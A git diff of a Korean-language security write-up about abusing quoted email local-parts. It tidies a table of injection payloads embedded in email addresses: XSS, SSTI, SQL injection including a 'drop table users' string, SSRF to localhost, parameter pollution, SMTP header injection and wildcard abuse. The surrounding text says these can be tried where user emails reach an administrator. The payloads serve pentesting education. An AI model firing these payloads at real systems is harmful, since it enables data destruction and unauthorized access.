@@ -141,21 +141,22 @@ Local-Part 부분에서 “ 가 사용가능하다면 SMTP Injection 의 파급�
 공백 및 특수문자등 일반적인 Local-Part 부분에서 사용할 수 없는 문자들이 사용 가능해진다.
 즉, 특수문자를 사용해야하는 Web-attack 공격기법들이 전부 사용 가능할 수 있다.
 
-| <span style="color:red">Vlunability</span> | <span style="color:red">Payload</span> |
-|-----------------------------|--------------------------------------------------|
-| XSS                         | test+(\<script\>alert(1)\</script\>)@example.com   |
-|                             | test@example(\<script\>alert(1)\</scripts\>.com     |
-|                             | ”<script>alert(1)</script>”@example.com        |
-| Templiate Injection (SSTI)  | “<%=7*7%>”@example.com                         |
-|                             | test+(${{7*7}})@example.com                    |
-| SQL Injection               | “’ or 1=1 —’”@example.com                      |
-|                             | ”mail’); drop table users;—”@exapmle.com       |
-| SSRF                        | trust@abc123.interserver                       |
-|                             | trust@[127.0.0.1]                              |
-| Parameter Pollution         | victim&email=attacker@example.com              |
-| (Email) SMTP Header Injection | “%0d%0aContent-Length;%200%0d%0a%0d%0a”@example.com |
-|                             | ”recipient@test.com>\r\nRCPT TO;<victim+”@test.com |
-| Wildcard abuse              | %@example.com                                 |
+| Vulnerability                  | Payload                                                      |
+|--------------------------------|--------------------------------------------------------------|
+| XSS                            | test+(\<script\>alert(1)\</script\>)@example.com               |
+|                                | test@example(\<script\>alert(1)\</script\>.com                |
+|                                | "<script>alert(1)</script>"@example.com                   |
+| Template Injection (SSTI)      | "<%=7*7%>"@example.com                                     |
+|                                | test+(${{7*7}})@example.com                                |
+| SQL Injection                  | "' or 1=1 --'"@example.com                                 |
+|                                | "mail'); drop table users;--"@example.com                  |
+| SSRF                           | trust@abc123.interserver                                   |
+|                                | trust@[127.0.0.1]                                          |
+| Parameter Pollution            | victim&email=attacker@example.com                          |
+| (Email) SMTP Header Injection  | "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com         |
+|                                | "recipient@test.com>\r\nRCPT TO:<victim+"@test.com         |
+| Wildcard abuse                 | %@example.com                                              |
+
 
 
 💡 **<u style="color:red;">이러한 공격들은 특정 사용자들의 이메일 정보를 관리자에게 보낼 때 시도해볼 수 있다.</u>**
